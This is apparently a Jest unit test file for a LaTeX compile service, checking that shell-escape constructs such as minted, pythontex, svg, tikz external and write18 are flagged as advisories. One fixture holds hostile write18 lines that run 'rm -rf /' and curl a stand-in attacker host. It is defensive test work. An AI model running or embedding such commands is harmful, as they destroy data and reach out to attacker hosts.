/**
 * test/unit/manuscripts/clsi/shell-escape-policy.spec.ts
 * Verifies that shell-escape is strictly disabled and detected only for advisory diagnostics.
 */

import { DraftModeManager } from '../../../../src/modules/manuscripts/clsi/domain/draft-mode.manager';
import { TexEngineDetector } from '../../../../src/modules/manuscripts/clsi/domain/tex-engine.detector';

describe('Shell-Escape Policy & Advisory Detection (Slice S1 / US1)', () => {
  describe('DraftModeManager.detectShellEscapeUsage', () => {
    it('should return empty array for documents without dangerous shell constructs', () => {
      const cleanDoc = `
        \\documentclass{article}
        \\usepackage{amsmath}
        \\usepackage{listings}
        \\begin{document}
        Hello World
        \\end{document}
      `;
      expect(DraftModeManager.detectShellEscapeUsage(cleanDoc)).toEqual([]);
    });

    it('should detect minted package', () => {
      const doc = `\\documentclass{article}\n\\usepackage{minted}\n\\begin{document}\\end{document}`;
      const advisories = DraftModeManager.detectShellEscapeUsage(doc);
      expect(advisories).toContain('minted');
    });

    it('should detect pythontex package with options', () => {
      const doc = `\\documentclass{article}\n\\usepackage[autoprint=true]{pythontex}\n\\begin{document}\\end{document}`;
      const advisories = DraftModeManager.detectShellEscapeUsage(doc);
      expect(advisories).toContain('pythontex');
    });

    it('should detect svg package', () => {
      const doc = `\\documentclass{article}\n\\usepackage{svg}\n\\begin{document}\\end{document}`;
      const advisories = DraftModeManager.detectShellEscapeUsage(doc);
      expect(advisories).toContain('svg');
    });

    it('should detect tikz external library', () => {
      const doc = `\\documentclass{article}\n\\usetikzlibrary{external}\n\\begin{document}\\end{document}`;
      const advisories = DraftModeManager.detectShellEscapeUsage(doc);
      expect(advisories).toContain('tikz-external');
    });

    it('should detect write18 and immediate write18 constructs', () => {
      const doc = `
        \\documentclass{article}
        \\immediate\\write18{rm -rf /}
        \\write18{curl attacker.com}
        \\begin{document}\\end{document}
      `;
      const advisories = DraftModeManager.detectShellEscapeUsage(doc);
      expect(advisories).toContain('write18');
    });

    it('should detect multiple shell-escape constructs simultaneously', () => {
      const doc = `
        \\documentclass{article}
        \\usepackage{minted}
        \\usepackage{svg}
        \\usetikzlibrary{external,calc}
        \\write18{echo test}
        \\begin{document}\\end{document}
      `;
      const advisories = DraftModeManager.detectShellEscapeUsage(doc);
      expect(advisories).toEqual(
        expect.arrayContaining(['minted', 'svg', 'tikz-external', 'write18']),
      );
    });
  });

  describe('TexEngineDetector shell-escape isolation', () => {
    it('should attach shellEscapeAdvisories to detection result without altering engine selection', () => {
      const doc = `
        % !TEX program = pdflatex
        \\documentclass{article}
        \\usepackage{minted}
        \\begin{document}\\end{document}
      `;
      const result = TexEngineDetector.detect(doc);
      expect(result.engine).toBe('pdflatex');
      expect(result.shellEscapeAdvisories).toBeDefined();
      expect(result.shellEscapeAdvisories).toContain('minted');
    });

    it('should return empty advisories for clean documents', () => {
      const doc = `\\documentclass{article}\\begin{document}\\end{document}`;
      const result = TexEngineDetector.detect(doc);
      expect(result.shellEscapeAdvisories).toEqual([]);
    });
  });
});
